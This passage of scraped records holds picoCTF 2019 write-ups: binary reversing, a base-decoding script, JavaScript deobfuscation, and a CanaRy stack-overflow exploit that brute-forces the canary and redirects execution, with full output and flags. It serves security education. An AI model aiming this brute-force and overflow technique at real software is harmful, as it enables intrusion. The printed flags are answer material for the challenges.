parallel:\r\n\r\n```console\r\nE:\\CTFs\\pico\\B1ll_Gat35>win-exec-1.exe\r\nInput a number between 1 and 5 digits: 1\r\nInitializing...\r\nEnter the correct key to get the access codes: 425\r\nIncorrect key. Try again.\r\n```\r\n\r\nNo-go. Let's continue stepping. We are requested to enter our key at `win-exec-1-noaslr.4036ED` (a.k.a. `___acrt_iob_func`). We enter a random string (e.g. `1234`) and continue.\r\n\r\nA few steps later, we see another interesting string in `ecx`:\r\n\r\n```\r\n004080F0 | 50                       | push eax                                           |\r\n004080F1 | 6A 64                    | push 64                                            |\r\n004080F3 | 8D4D 98                  | lea ecx,dword ptr ss:[ebp-68]                      |\r\n004080F6 | 51                       | push ecx                                           | ecx:\"The key is: 4253360\"\r\n004080F7 | E8 61AAFFFF              | call win-exec-1-noaslr.402B5D                      |\r\n004080FC | 83C4 0C                  | add esp,C                                          |\r\n004080FF | 8D55 98                  | lea edx,dword ptr ss:[ebp-68]                      |\r\n00408102 | 52                       | push edx                                           |\r\n00408103 | E8 ADACFFFF              | call win-exec-1-noaslr.402DB5                      |\r\n00408108 | 83C4 04                  | add esp,4                                          |<<----------------------------- EIP\r\n0040810B | 8845 97                  | mov byte ptr ss:[ebp-69],al                        |\r\n0040810E | 0FB645 97                | movzx eax,byte ptr ss:[ebp-69]                     |\r\n00408112 | 85C0                     | test eax,eax                                       |\r\n00408114 | 75 0F                    | jne win-exec-1-noaslr.408125                       |\r\n00408116 | 68 F8B04700              | push win-exec-1-noaslr.47B0F8                      | 47B0F8:\"Incorrect key. Try again.\\n\"\r\n0040811B | E8 4593FFFF              | call win-exec-1-noaslr.401465                      |\r\n00408120 | 83C4 04                  | add esp,4                                          |\r\n00408123 | EB 12                    | jmp win-exec-1-noaslr.408137                       |\r\n00408125 | 68 14B14700              | push win-exec-1-noaslr.47B114                      | 47B114:\"Correct input. Printing flag: \"\r\n0040812A | E8 3693FFFF              | call win-exec-1-noaslr.401465                      |\r\n0040812F | 83C4 04                  | add esp,4                                          |\r\n00408132 | E8 CE9DFFFF              | call win-exec-1-noaslr.401F05                      |\r\n```\r\n\r\nIt now says \"`The key is: 4253360`\". Let's try that in parallel:\r\n\r\n```console\r\nE:\\CTFs\\pico\\B1ll_Gat35>win-exec-1.exe\r\nInput a number between 1 and 5 digits: 1\r\nInitializing...\r\nEnter the correct key to get the access codes: 4253360\r\nIncorrect key. Try again.\r\n```\r\n\r\nDidn't work. But what if we try the complete string?\r\n```console\r\nE:\\CTFs\\pico\\B1ll_Gat35>win-exec-1.exe\r\nInput a number between 1 and 5 digits: 1\r\nInitializing...\r\nEnter the correct key to get the access codes: The key is: 4253360\r\nCorrect input. Printing flag: PICOCTF{These are the access codes to the vault: 1063340}\r\n```\r\n\r\nThat actually gives us the flag, without any need to reverse the deeper levels.", "timestamp": "2025-10-21T13:36:25.117426"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Based.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Based.md", "content": "# Based\r\nGeneral Skills, 200 points\r\n\r\n## Description:\r\n> To get truly 1337, you must understand different data encodings, such as hexadecimal or binary. Can you get the flag from this program to prove you are on the way to becoming 1337?\r\n\r\n\r\n## Solution: \r\n\r\nWe connect to the service and get the following request:\r\n```console\r\nLet us see how data is stored\r\nchair\r\nPlease give the 01100011 01101000 01100001 01101001 01110010 as a word.\r\n...\r\nyou have 45 seconds.....\r\n\r\nInput:\r\n```\r\n\r\nThis looks like binary, let's decode:\r\n```python\r\n>>> for x in \"01100011 01101000 01100001 01101001 01110010\".split(\" \"):\r\n...     sys.stdout.write(chr(int(x, 2)))\r\nchair\r\n```\r\n\r\nOur input is accepted, and another request is received:\r\n```console\r\nPlease give me the  146 141 154 143 157 156 as a word.\r\nInput:\r\n```\r\n\r\nThis looks like base 8 (highest value is 7), let's decode:\r\n```python\r\n>>> for x in \"146 141 154 143 157 156\".split(\" \"):\r\n...     sys.stdout.write(chr(int(x,8)))\r\nfalcon\r\n```\r\n\r\nSince we keep getting new requests in different bases, let's write a script to decode a given sequence with an unknown base:\r\n```python\r\nfrom pwn import *\r\nimport re\r\nimport string\r\n\r\n#context.log_level = \"DEBUG\"\r\n\r\nr = remote(\"2019shell1.picoctf.com\", 7380)\r\n\r\ndef get_base_encoded_str(r):\r\n    s = r.recvuntil(\"the \")\r\n    if (\"Please\" not in s):\r\n        r.recvline()\r\n        return None\r\n    s = r.recvuntil(\" as a word.\", drop = True)\r\n    return s.strip()\r\n\r\ndef decode_string_as_char_array(s, base):\r\n    res = \"\"\r\n    for unit in s.split(\" \"):\r\n        c = chr(int(unit, base))\r\n        if c not in string.ascii_letters:\r\n            raise Exception(\"Non-ASCII result\")\r\n        res += c\r\n    return res\r\n\r\ndef try_decode_as_char_array_with_unknown_base(s):\r\n    for base in range(1, 17):\r\n        try:\r\n            res = decode_string_as_char_array(s, base)\r\n            log.info(\"Decode successful with base {}\".format(base))\r\n            return res\r\n        except:\r\n            pass\r\n    return None\r\n\r\ndef try_decode_as_hex(s):\r\n    try:\r\n        return s.decode(\"hex\")\r\n    except:\r\n        return None\r\n\r\nr.recvline()\r\nr.recvline()\r\ns = get_base_encoded_str(r)\r\nwhile s is not None:\r\n    log.info(\"Trying to decode '{}'\".format(s))\r\n    res = try_decode_as_char_array_with_unknown_base(s) or try_decode_as_hex(s)\r\n    if res is None:\r\n        log.error(\"Can't decode '{}'\".format(s))\r\n        break\r\n    log.info(\"Decoded as '{}'\".format(res))\r\n    r.sendlineafter(\"Input:\", res)\r\n    s = get_base_encoded_str(r)\r\n\r\nprint r.recvall()\r\n```\r\n\r\nOutput:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Based# python solve.py\r\n[+] Opening connection to 2019shell1.picoctf.com on port 7380: Done\r\n[*] Trying to decode '01110000 01100101 01100001 01110010'\r\n[*] Decode successful with base 2\r\n[*] Decoded as 'pear'\r\n[*] Trying to decode '164 145 163 164'\r\n[*] Decode successful with base 8\r\n[*] Decoded as 'test'\r\n[*] Trying to decode '737472656574'\r\n[*] Decoded as 'street'\r\n[+] Receiving all data: Done (57B)\r\n[*] Closed connection to 2019shell1.picoctf.com port 7380\r\nFlag: picoCTF{learning_about_converting_values_8e70d435}\r\n```", "timestamp": "2025-10-21T13:36:25.297161"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/CanaRy.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/CanaRy.md", "content": "# CanaRy\r\nBinary Exploitation, 300 points\r\n\r\n## Description:\r\n> This time we added a canary to detect buffer overflows. Can you still find a way to retreive the flag from this program?\r\n\r\n```c\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <unistd.h>\r\n#include <sys/types.h>\r\n#include <wchar.h>\r\n#include <locale.h>\r\n\r\n#define BUF_SIZE 32\r\n#define FLAG_LEN 64\r\n#define KEY_LEN 4\r\n\r\nvoid display_flag() {\r\n  char buf[FLAG_LEN];\r\n  FILE *f = fopen(\"flag.txt\",\"r\");\r\n  if (f == NULL) {\r\n    printf(\"'flag.txt' missing in the current directory!\\n\");\r\n    exit(0);\r\n  }\r\n  fgets(buf,FLAG_LEN,f);\r\n  puts(buf);\r\n  fflush(stdout);\r\n}\r\n\r\nchar key[KEY_LEN];\r\nvoid read_canary() {\r\n  FILE *f = fopen(\"/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/canary.txt\",\"r\");\r\n  if (f == NULL) {\r\n    printf(\"[ERROR]: Trying to Read Canary\\n\");\r\n    exit(0);\r\n  }\r\n  fread(key,sizeof(char),KEY_LEN,f);\r\n  fclose(f);\r\n}\r\n\r\nvoid vuln(){\r\n   char canary[KEY_LEN];\r\n   char buf[BUF_SIZE];\r\n   char user_len[BUF_SIZE];\r\n\r\n   int count;\r\n   int x = 0;\r\n   memcpy(canary,key,KEY_LEN);\r\n   printf(\"Please enter the length of the entry:\\n> \");\r\n\r\n   while (x<BUF_SIZE) {\r\n      read(0,user_len+x,1);\r\n      if (user_len[x]=='\\n') break;\r\n      x++;\r\n   }\r\n   sscanf(user_len,\"%d\",&count);\r\n\r\n   printf(\"Input> \");\r\n   read(0,buf,count);\r\n\r\n   if (memcmp(canary,key,KEY_LEN)) {\r\n      printf(\"*** Stack Smashing Detected *** : Canary Value Corrupt!\\n\");\r\n      exit(-1);\r\n   }\r\n   printf(\"Ok... Now Where's the Flag?\\n\");\r\n   fflush(stdout);\r\n}\r\n\r\nint main(int argc, char **argv){\r\n\r\n  setvbuf(stdout, NULL, _IONBF, 0);\r\n  \r\n  int i;\r\n  gid_t gid = getegid();\r\n  setresgid(gid, gid, gid);\r\n\r\n  read_canary();\r\n  vuln();\r\n\r\n  return 0;\r\n}\r\n```\r\n\r\n\r\n## Solution:\r\n\r\nThis challenge is similar to last year's [buffer overflow 3](/2018_picoCTF/buffer%20overflow%203.md). We can brute-force the canary byte-by-byte just like last year.\r\n\r\n```python\r\n# First, generate a pwntools template using:\r\n# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln\r\n\r\n#===========================================================\r\n#                    EXPLOIT GOES HERE\r\n#===========================================================\r\n# Arch:     i386-32-little\r\n# RELRO:    Full RELRO\r\n# Stack:    No canary found\r\n# NX:       NX enabled\r\n# PIE:      PIE enabled\r\n\r\nimport os\r\nimport string\r\n\r\nif shell is not None:\r\n    shell.set_working_directory(os.path.dirname(remote_path))\r\n\r\nBUF_SIZE    = 32\r\nFLAG_LEN    = 64\r\nKEY_LEN     = 4\r\n\r\nFILLER_LEN = BUF_SIZE + KEY_LEN\r\n\r\ndef brute_force_canary():\r\n    canary = \"\"\r\n    for i in range(KEY_LEN):\r\n        for c in string.ascii_letters + string.digits:\r\n            with context.local(log_level='ERROR'):\r\n                try:\r\n                    io = start()\r\n                    io.sendlineafter(\"Please enter the length of the entry:\\n> \", str(BUF_SIZE + len(canary) + 1))\r\n                    io.sendlineafter(\"Input> \", fit({BUF_SIZE: canary + c}))\r\n                    response = io.recvline()\r\n                    if \"Stack Smashing Detected\" in response:\r\n                        continue\r\n                    canary += c\r\n                    break\r\n                finally:\r\n                    io.close()\r\n        else:\r\n            raise Exception(\"Can't find canary\")\r\n    return canary\r\n\r\ndef send_payload(proc, payload, canary):\r\n    assert(len(canary) == KEY_LEN)\r\n    proc.sendlineafter(\"Please enter the length of the entry:\\n> \", str(FILLER_LEN + len(payload)))\r\n    proc.sendafter(\"Input> \", ('A' * BUF_SIZE) + (canary) + payload)\r\n\r\ndef get_overflow_offset(canary):\r\n    # It's problematic to create a core dump on an NTFS file system,\r\n    # so reconfigure core dumps to be created elsewhere\r\n    os.system(\"echo ~/core/core_dump > /proc/sys/kernel/core_pattern\")\r\n    os.system(\"rm core.* > /dev/null\")\r\n    proc = process(exe.path)\r\n    payload = cyclic(100, n = exe.bytes)\r\n    send_payload(proc, payload, canary)\r\n    proc.wait()\r\n    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )\r\n    log.info(\"Overflow offset: {} ({}-byte architecture)\".format(offset, exe.bytes))\r\n    return offset\r\n\r\ncanary = brute_force_canary()\r\nlog.info(\"Canary: {}\".format(canary))\r\n\r\noverflow_offset = get_overflow_offset(canary)\r\n\r\nresponse = \"\"\r\n\r\npayload = fit({overflow_offset: p16(exe.symbols[\"display_flag\"])}, filler = 'B')\r\nlog.info(\"Sending payload: \\n{}\".format(hexdump(payload)))\r\n\r\nwhile \"pico\" not in response:\r\n    io = start()\r\n    send_payload(io, payload, canary)\r\n    response = io.recvall()\r\n\r\nprint response\r\n```\r\n\r\nOutput:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/CanaRy# python exploit.py\r\n[*] '/media/sf_CTFs/pico/CanaRy/vuln'\r\n    Arch:     i386-32-little\r\n    RELRO:    Full RELRO\r\n    Stack:    No canary found\r\n    NX:       NX enabled\r\n    PIE:      PIE enabled\r\n[+] Connecting to 2019shell1.picoctf.com on port 22: Done\r\n[*] dvdalt@2019shell1.picoctf.com:\r\n    Distro    Ubuntu 18.04\r\n    OS:       linux\r\n    Arch:     amd64\r\n    Version:  4.15.0\r\n    ASLR:     Enabled\r\n[+] Opening new channel: 'pwd': Done\r\n[+] Receiving all data: Done (13B)\r\n[*] Closed SSH channel with 2019shell1.picoctf.com\r\n[*] Working directory: '/tmp/tmp.fCS9EiLuRM'\r\n[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done\r\n[+] Receiving all data: Done (0B)\r\n[*] Closed SSH channel with 2019shell1.picoctf.com\r\n[*] Working directory: '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe'\r\n[*] Canary: wrvW\r\n[+] Starting local process '/media/sf_CTFs/pico/CanaRy/vuln': pid 8295\r\n[*] Process '/media/sf_CTFs/pico/CanaRy/vuln' stopped with exit code -11 (SIGSEGV) (pid 8295)\r\n[+] Parsing corefile...: Done\r\n[*] '/media/sf_CTFs/pico/CanaRy/core.8295'\r\n    Arch:      i386-32-little\r\n    EIP:       0x61616165\r\n    ESP:       0xffb65e10\r\n    Exe:       '/media/sf_CTFs/pico/CanaRy/vuln' (0x565d1000)\r\n    Fault:     0x61616165\r\n[*] Overflow offset: 16 (4-byte architecture)\r\n[*] Sending payload:\r\n    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│\r\n    00000010  ed 07                                               │··│\r\n    00000012\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1225421\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1225421)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1225619\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1225619)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1225709\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1225709)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1225806\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1225806)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1225908\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1225908)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1226017\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1226017)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1226294\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1226294)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1226383\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1226383)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1226470\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1226470)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1226558\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1226558)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1226645\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1226645)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1226734\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1226734)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1226834\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1226834)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1227009\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1227009)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1227098\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1227098)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1227187\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1227187)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1227281\r\n[+] Receiving all data: Done (28B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1227281)\r\n[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1227472\r\n[+] Receiving all data: Done (71B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1227472)\r\nOk... Now Where's the Flag?\r\npicoCTF{cAnAr135_mU5t_b3_r4nd0m!_40765d8a}\r\n```", "timestamp": "2025-10-21T13:36:25.401498"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Client-side-again.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Client-side-again.md", "content": "# Client-side-again\r\nWeb Exploitation, 200 points\r\n\r\n## Description:\r\n> Can you break into this super secure portal?\r\n\r\n\r\n## Solution: \r\n\r\nWe visit the website and inspect the source code:\r\n```html\r\n<html>\r\n<head>\r\n<title>Secure Login Portal V2.0</title>\r\n</head>\r\n<body background=\"barbed_wire.jpeg\" >\r\n<!-- standard MD5 implementation -->\r\n<script type=\"text/javascript\" src=\"md5.js\"></script>\r\n\r\n<script type=\"text/javascript\">\r\n  var _0x5a46=['55670}','_again_0','this','Password\\x20Verified','Incorrect\\x20password','getElementById','value','substring','picoCTF{','not_this'];(function(_0x4bd822,_0x2bd6f7){var _0xb4bdb3=function(_0x1d68f6){while(--_0x1d68f6){_0x4bd822['push'](_0x4bd822['shift']());}};_0xb4bdb3(++_0x2bd6f7);}(_0x5a46,0x1b3));var _0x4b5b=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x5a46[_0x2d8f05];return _0x4d74cb;};function verify(){checkpass=document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];split=0x4;if(checkpass[_0x4b5b('0x2')](0x0,split*0x2)==_0x4b5b('0x3')){if(checkpass[_0x4b5b('0x2')](0x7,0x9)=='{n'){if(checkpass[_0x4b5b('0x2')](split*0x2,split*0x2*0x2)==_0x4b5b('0x4')){if(checkpass[_0x4b5b('0x2')](0x3,0x6)=='oCT'){if(checkpass[_0x4b5b('0x2')](split*0x3*0x2,split*0x4*0x2)==_0x4b5b('0x5')){if(checkpass['substring'](0x6,0xb)=='F{not'){if(checkpass[_0x4b5b('0x2')](split*0x2*0x2,split*0x3*0x2)==_0x4b5b('0x6')){if(checkpass[_0x4b5b('0x2')](0xc,0x10)==_0x4b5b('0x7')){alert(_0x4b5b('0x8'));}}}}}}}}else{alert(_0x4b5b('0x9'));}}\r\n</script>\r\n<div style=\"position:relative; padding:5px;top:50px; left:38%; width:350px; height:140px; background-color:gray\">\r\n<div style=\"text-align:center\">\r\n<p>New and Improved Login</p>\r\n\r\n<p>Enter valid credentials to proceed</p>\r\n<form action=\"index.html\" method=\"post\">\r\n<input type=\"password\" id=\"pass\" size=\"8\" />\r\n<br/>\r\n<input type=\"submit\" value=\"verify\" onclick=\"verify(); return false;\" />\r\n</form>\r\n</div>\r\n</div>\r\n</body>\r\n</html>\r\n```\r\n\r\nLet's call a [Javascript Beautifier](http://www.jsnice.org/) in order to make the Javascript code a bit more readable:\r\n\r\n```javascript\r\n'use strict';\r\n/** @type {!Array} */\r\nvar _0x5a46 = [\"c2047}\", \"_again_6\", \"this\", \"Password Verified\", \"Incorrect password\", \"getElementById\", \"value\", \"substring\", \"picoCTF{\", \"not_this\"];\r\n(function(data, i) {\r\n  /**\r\n   * @param {number} isLE\r\n   * @return {undefined}\r\n   */\r\n  var write = function(isLE) {\r\n    for (; --isLE;) {\r\n      data[\"push\"](data[\"shift\"]());\r\n    }\r\n  };\r\n  write(++i);\r\n})(_0x5a46, 435);\r\n/**\r\n * @param {string} level\r\n * @param {?} ai_test\r\n * @return {?}\r\n */\r\nvar _0x4b5b = function(level, ai_test) {\r\n  /** @type {number} */\r\n  level = level - 0;\r\n  var rowsOfColumns = _0x5a46[level];\r\n  return rowsOfColumns;\r\n};\r\n/**\r\n * @return {undefined}\r\n */\r\nfunction verify() {\r\n  checkpass = document[_0x4b5b(\"0x0\")](\"pass\")[_0x4b5b(\"0x1\")];\r\n  /** @type {number} */\r\n  split = 4;\r\n  if (checkpass[_0x4b5b(\"0x2\")](0, split * 2) == _0x4b5b(\"0x3\")) {\r\n    if (checkpass[_0x4b5b(\"0x2\")](7, 9) == \"{n\") {\r\n      if (checkpass[_0x4b5b(\"0x2\")](split * 2, split * 2 * 2) == _0x4b5b(\"0x4\")) {\r\n        if (checkpass[_0x4b5b(\"0x2\")](3, 6) == \"oCT\") {\r\n          if (checkpass[_0x4b5b(\"0x2\")](split * 3 * 2, split * 4 * 2) == _0x4b5b(\"0x5\")) {\r\n            if (checkpass[\"substring\"](6, 11) == \"F{not\") {\r\n                if (checkpass[_0x4b5b(\"0x2\")](12, 16) == _0x4b5b(\"0x7\")) {\r\n              if (checkpass[_0x4b5b(\"0x2\")](split * 2 * 2, split * 3 * 2) == _0x4b5b(\"0x6\")) {\r\n                  alert(_0x4b5b(\"0x8\"));\r\n                }\r\n              }\r\n            }\r\n          }\r\n        }\r\n      }\r\n    }\r\n  } else {\r\n    alert(_0x4b5b(\"0x9\"));\r\n  }\r\n}\r\n;\r\n```\r\n\r\nWe see that `_0x4b5b` is a function used to obfuscate different values. It is calculated in runtime. Luckily, we can use the browser's Javascript console (\"Developer Tools\") in order to evaluate `_0x4b5b` and read its values:\r\n\r\n```\r\n>>> _0x4b5b\r\nfunction _0x4b5b()\r\n\r\n>>> _0x4b5b(\"0x0\")\r\n\"getElementById\"\r\n>>> _0x4b5b(\"0x1\")\r\n\"value\"\r\n>>> _0x4b5b(\"0x2\")\r\n\"substring\"\r\n>>> _0x4b5b(\"0x3\")\r\n\"picoCTF{\"\r\n>>> _0x4b5b(\"0x4\")\r\n\"not_this\"\r\n>>> _0x4b5b(\"0x5\")\r\n\"55670}\"\r\n>>> _0x4b5b(\"0x6\")\r\n\"_again_0\"\r\n>>> _0x4b5b(\"0x7\")\r\n\"this\"\r\n>>> _0x4b5b(\"0x8\")\r\n\"Password Verified\"\r\n>>> _0x4b5b(\"0x9\")\r\n\"Incorrect password\"\r\n```\r\n\r\nLet's replace the function calls with hardcoded values to improve readability:\r\n```javascript\r\nfunction verify() {\r\n  checkpass = document[\"getElementById\"](\"pass\")[\"value\"];\r\n  /** @type {number} */\r\n  split = 4;\r\n  if (checkpass[\"substring\"](0, split * 2) == \"picoCTF{\") {\r\n    if (checkpass[\"substring\"](7, 9) == \"{n\") {\r\n      if (checkpass[\"substring\"](split * 2, split * 2 * 2) == \"not_this\") {\r\n        if (checkpass[\"substring\"](3, 6) == \"oCT\") {\r\n          if (checkpass[\"substring\"](split * 3 * 2, split * 4 * 2) == \"55670}\") {\r\n            if (checkpass[\"substring\"](6, 11) == \"F{not\") {\r\n                if (checkpass[\"substring\"](12, 16) == \"this\") {\r\n              if (checkpass[\"substring\"](split * 2 * 2, split * 3 * 2) == \"_again_0\") {\r\n                  alert(\"Password Verified\");\r\n                }\r\n              }\r\n            }\r\n          }\r\n        }\r\n      }\r\n    }\r\n  } else {\r\n    alert(\"Incorrect password\");\r\n  }\r\n}\r\n```\r\n\r\nSo this is very similar to [dont-use-client-side](dont-use-client-side.md), using `substring` to authenticate the password.\r\n\r\nWe have:\r\n```\r\n(0-8)      == \"picoCTF{\"\r\n(7-9)      == \"{n\"\r\n(8-16)     == \"not_this\"\r\n(3-6)      == \"oCT\"\r\n(24-32)    == \"c2047}\"\r\n(6-11)     == \"F{not\"\r\n(16-24)    == \"_again_6\"\r\n(12-16)    == \"this\"\r\n```\r\n\r\nNotice that there are some overlaps.\r\n\r\nAn evil way to turn this into a flag would be by transforming the javascript substrings into Python array-assignment code and executing it:\r\n\r\n```python\r\ntext = \"\"\"\r\n  if (checkpass[\"substring\"](0, split * 2) == \"picoCTF{\") {\r\n    if (checkpass[\"substring\"](7, 9) == \"{n\") {\r\n      if (checkpass[\"substring\"](split * 2, split * 2 * 2) == \"not_this\") {\r\n        if (checkpass[\"substring\"](3, 6) == \"oCT\") {\r\n          if (checkpass[\"substring\"](split * 3 * 2, split * 4 * 2) == \"55670}\") {\r\n            if (checkpass[\"substring\"](6, 11) == \"F{not\") {\r\n                if (checkpass[\"substring\"](12, 16) == \"this\") {\r\n              if (checkpass[\"substring\"](split * 2 * 2, split * 3 * 2) == \"_again_0\") {\r\n\"\"\"\r\n\r\nflag = [None] * 32\r\nsplit = 4\r\nfor line in text.split(\"\\n\"):\r\n    line = line.strip()\r\n    if line == \"\": \r\n        continue\r\n    line = line.replace('if (checkpass[\"substring\"](', 'flag[').replace(', ', \":\").replace(') == ', '] = ').replace(') {', '')\r\n    exec(line)\r\n\r\nprint \"\".join(flag)\r\n```\r\n\r\nThis gives us the flag at the price of allowing `exec` to slip into our code.\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Client-side-again# python solve.py\r\nflag[0:split * 2] = \"picoCTF{\"\r\nflag[7:9] = \"{n\"\r\nflag[split * 2:split * 2 * 2] = \"not_this\"\r\nflag[3:6] = \"oCT\"\r\nflag[split * 3 * 2:split * 4 * 2] = \"55670}\"\r\nflag[6:11] = \"F{not\"\r\nflag[12:16] = \"this\"\r\nflag[split * 2 * 2:split * 3 * 2] = \"_again_0\"\r\npicoCTF{not_this_again_055670}\r\n```", "timestamp": "2025-10-21T13:36:25.508685"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Easy1.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Easy1.md", "content": "# Easy1\r\nCryptography, 100 points\r\n\r\n## Description:\r\n> The one time pad can be cryptographically secure, but not when you know the key. Can you solve this? We've given you the encrypted flag, key, and a table to help UFJKXQZQUNB with the key of SOLVECRYPTO. Can you use this table to solve it?\r\n\r\n```\r\n    A B C D E F G H I J K L M N O P Q R S T U V W X Y Z \r\n   +----------------------------------------------------\r\nA | A B C D E F G H I J K L M N O P Q R S T U V W X Y Z\r\nB | B C D E F G H I J K L M N O P Q R S T U V W X Y Z A\r\nC | C D E F G H I J K L M N O P Q R S T U V W X Y Z A B\r\nD | D E F G H I J K L M N O P Q R S T U V W X Y Z A B C\r\nE | E F G H I J K L M N O P Q R S T U V W X Y Z A B C D\r\nF | F G H I J K L M N O P Q R S T U V W X Y Z A B C D E\r\nG | G H I J K L M N O P Q R S T U V W X Y Z A B C D E F\r\nH | H I J K L M N O P Q R S T U V W X Y Z A B C D E F G\r\nI | I J K L M N O P Q R S T U V W X Y Z A B C D E F G H\r\nJ | J K L M N O P Q R S T U V W X Y Z A B C D E F G H I\r\nK | K L M N O P Q R S T U V W X Y Z A B C D E F G H I J\r\nL | L M N O P Q R S T U V W X Y Z A B C D E F G H I J K\r\nM | M N O P Q R S T U V W X Y Z A B C D E F G H I J K L\r\nN | N O P Q R S T U V W X Y Z A B C D E F G H I J K L M\r\nO | O P Q R S T U V W X Y Z A B C D E F G H I J K L M N\r\nP | P Q R S T U V W X Y Z A B C D E F G H I J K L M N O\r\nQ | Q R S T U V W X Y Z A B C D E F G H I J K L M N O P\r\nR | R S T U V W X Y Z A B C D E F G H I J K L M N O P Q\r\nS | S T U V W X Y Z A B C D E F G H I J K L M N O P Q R\r\nT | T U V W X Y Z A B C D E F G H I J K L M N O P Q R S\r\nU | U V W X Y Z A B C D E F G H I J K L M N O P Q R S T\r\nV | V W X Y Z A B C D E F G H I J K L M N O P Q R S T U\r\nW | W X Y Z A B C D E F G H I J K L M N O P Q R S T U V\r\nX | X Y Z A B C D E F G H I J K L M N O P Q R S T U V W\r\nY | Y Z A B C D E F G H I J K L M N O P Q R S T U V W X\r\nZ | Z A B C D E F G H I J K L M N O P Q R S T U V W X Y\r\n```\r\n\r\n\r\n## Solution: 